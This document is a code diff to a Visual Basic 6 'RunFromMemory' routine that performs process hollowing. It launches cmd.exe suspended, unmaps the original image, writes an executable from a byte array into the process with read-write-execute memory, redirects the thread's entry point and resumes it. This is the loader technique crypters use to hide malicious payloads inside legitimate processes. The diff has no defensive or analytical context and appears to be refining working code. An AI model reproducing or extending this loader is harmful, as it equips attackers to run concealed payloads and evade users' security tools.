@@ -49,14 +49,6 @@ Private Type CONTEXT86
     SegSs As Long
 End Type
 
-Private Const CONTEXT_X86 = &H10000
-Private Const CONTEXT86_CONTROL = (CONTEXT_X86 Or &H1)          'SS:SP, CS:IP, FLAGS, BP
-Private Const CONTEXT86_INTEGER = (CONTEXT_X86 Or &H2)          'AX, BX, CX, DX, SI, DI
-Private Const CONTEXT86_SEGMENTS = (CONTEXT_X86 Or &H4)         'DS, ES, FS, GS
-Private Const CONTEXT86_FLOATING_POINT = (CONTEXT_X86 Or &H8)   '387 state
-Private Const CONTEXT86_DEBUG_REGISTERS = (CONTEXT_X86 Or &H10) 'DB 0-3,6,7
-Private Const CONTEXT86_FULL = (CONTEXT86_CONTROL Or CONTEXT86_INTEGER Or CONTEXT86_SEGMENTS)
-
 Private Declare Function GetThreadContext Lib "kernel32" (ByVal hThread As Long, lpContext As CONTEXT86) As Long
 Private Declare Function SetThreadContext Lib "kernel32" (ByVal hThread As Long, lpContext As CONTEXT86) As Long
 Private Declare Function SuspendThread Lib "kernel32" (ByVal hThread As Long) As Long
@@ -70,8 +62,15 @@ Private Declare Function ZwUnmapViewOfSection Lib "ntdll.dll" (ByVal hProcess As
 Private Declare Function WriteProcessMemory Lib "kernel32" (ByVal hProcess As Long, lpBaseAddress As Any, lpBuffer As Any, ByVal nSize As Long, lpNumberOfBytesWritten As Long) As Long
 Private Declare Function ReadProcessMemory Lib "kernel32" (ByVal hProcess As Long, lpBaseAddress As Any, lpBuffer As Any, ByVal nSize As Long, lpNumberOfBytesWritten As Long) As Long
 Private Declare Function VirtualAllocEx Lib "kernel32" (ByVal hProcess As Long, ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
-Private Declare Function VirtualProtectEx Lib "kernel32" (ByVal hProcess As Long, lpAddress As Any, ByVal dwSize As Long, ByVal flNewProtect As Long, lpflOldProtect As Long) As Long
 Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
+
+Private Const CONTEXT_X86 = &H10000
+Private Const CONTEXT86_CONTROL = (CONTEXT_X86 Or &H1)
+Private Const CONTEXT86_INTEGER = (CONTEXT_X86 Or &H2)
+Private Const CONTEXT86_SEGMENTS = (CONTEXT_X86 Or &H4)
+Private Const CONTEXT86_FLOATING_POINT = (CONTEXT_X86 Or &H8)
+Private Const CONTEXT86_DEBUG_REGISTERS = (CONTEXT_X86 Or &H10)
+Private Const CONTEXT86_FULL = (CONTEXT86_CONTROL Or CONTEXT86_INTEGER Or CONTEXT86_SEGMENTS)
 
 Private Const CREATE_SUSPENDED = &H4
 Private Const MEM_COMMIT As Long = &H1000&
@@ -139,7 +138,7 @@ End Type
 '
 Private Type IMAGE_DATA_DIRECTORY
     VirtualAddress As Long
-    Size As Long
+    size As Long
 End Type
 
 '
@@ -229,33 +228,36 @@ Function RunFromMemory(abExeFile() As Byte, si As STARTUPINFO, pi As PROCESSINFO
         Exit Function
     End If
     
-    If CreateProcess(vbNullString, "cmd.exe " & Arguments, 0, 0, InheritHandles, CREATE_SUSPENDED Or CreationFlags, EnvironmentVariables, CurrentDir, si, pi) = 0 Then
+    If CreateProcess(vbNullString, GetCurrentEXEPath("cmd.exe") & " " & Arguments, 0, 0, InheritHandles, CREATE_SUSPENDED Or CreationFlags, EnvironmentVariables, CurrentDir, si, pi) = 0 Then
         RunFromMemory = 0&
         Exit Function
     End If
-       
-    context.ContextFlags = CONTEXT86_INTEGER
+    
+    context.ContextFlags = CONTEXT86_FULL
     If GetThreadContext(pi.hThread, context) = 0 Then GoTo ClearProcess
        
     ReadProcessMemory pi.hProcess, ByVal context.Ebx + 8, Addr, 4, 0
-    If Addr = 0 Then GoTo ClearProcess
-    If ZwUnmapViewOfSection(pi.hProcess, Addr) Then GoTo ClearProcess
-       
-    ImageBase = VirtualAllocEx(pi.hProcess, ByVal inh.OptionalHeader.ImageBase, inh.OptionalHeader.SizeOfImage, MEM_RESERVE Or MEM_COMMIT, PAGE_READWRITE)
-    If ImageBase = 0 Then GoTo ClearProcess
+    If Addr = inh.OptionalHeader.ImageBase Then
+        ZwUnmapViewOfSection pi.hProcess, Addr
+    End If
     
-    WriteProcessMemory pi.hProcess, ByVal ImageBase, abExeFile(0), inh.OptionalHeader.SizeOfHeaders, ret
-       
+    ImageBase = VirtualAllocEx(pi.hProcess, inh.OptionalHeader.ImageBase, inh.OptionalHeader.SizeOfImage, MEM_RESERVE Or MEM_COMMIT, PAGE_EXECUTE_READWRITE)
+    If ImageBase = 0 Then
+        ImageBase = VirtualAllocEx(pi.hProcess, 0&, inh.OptionalHeader.SizeOfImage, MEM_RESERVE Or MEM_COMMIT, PAGE_EXECUTE_READWRITE)
+        If ImageBase = 0 Then MsgBox 1: GoTo ClearProcess
+    End If
+    
+    WriteProcessMemory pi.hProcess, ByVal ImageBase, abExeFile(0), inh.OptionalHeader.SizeOfHeaders, 0&
+    
     lOffset = idh.e_lfanew + Len(inh)
     For i = 0 To inh.FileHeader.NumberOfSections - 1
         CopyMemory ish, abExeFile(lOffset + i * Len(ish)), Len(ish)
-        WriteProcessMemory pi.hProcess, ByVal ImageBase + ish.VirtualAddress, abExeFile(ish.PointerToRawData), ish.SizeOfRawData, ret
-        VirtualProtectEx pi.hProcess, ByVal ImageBase + ish.VirtualAddress, ish.VirtualSize, Protect(ish.characteristics), Addr
+        WriteProcessMemory pi.hProcess, ByVal ImageBase + ish.VirtualAddress, abExeFile(ish.PointerToRawData), ish.SizeOfRawData, 0&
     Next i
-       
-    WriteProcessMemory pi.hProcess, ByVal context.Ebx + 8, ImageBase, 4, ret
 
     context.Eax = ImageBase + inh.OptionalHeader.AddressOfEntryPoint
+    WriteProcessMemory pi.hProcess, ByVal context.Ebx + 8, ImageBase, 4, 0&
+
     SetThreadContext pi.hThread, context
     ResumeThread pi.hThread
     
@@ -263,29 +265,9 @@ Function RunFromMemory(abExeFile() As Byte, si As STARTUPINFO, pi As PROCESSINFO
     Exit Function
     
 ClearProcess:
+    TerminateProcess pi.hProcess, 0&
     CloseHandle pi.hThread
     CloseHandle pi.hProcess
     RunFromMemory = 0&
 End Function
-
-Private Function Protect(ByVal characteristics As Long) As Long
-    Dim mapping As Variant
-    mapping = Array(PAGE_NOACCESS, PAGE_EXECUTE, PAGE_READONLY, _
-                    PAGE_EXECUTE_READ, PAGE_READWRITE, PAGE_EXECUTE_READWRITE, _
-                    PAGE_READWRITE, PAGE_EXECUTE_READWRITE)
-    Protect = mapping(RShift(characteristics, 29))
-End Function
-
-Private Function RShift(ByVal lValue As Long, ByVal lNumberOfBitsToShift As Long) As Long
-    RShift = vbLongToULong(lValue) / (2 ^ lNumberOfBitsToShift)
-End Function
-
-Private Function vbLongToULong(ByVal Value As Long) As Double
-    If Value < 0 Then
-        vbLongToULong = Value + OFFSET_4
-    Else
-        vbLongToULong = Value
-    End If
-End Function
-
 
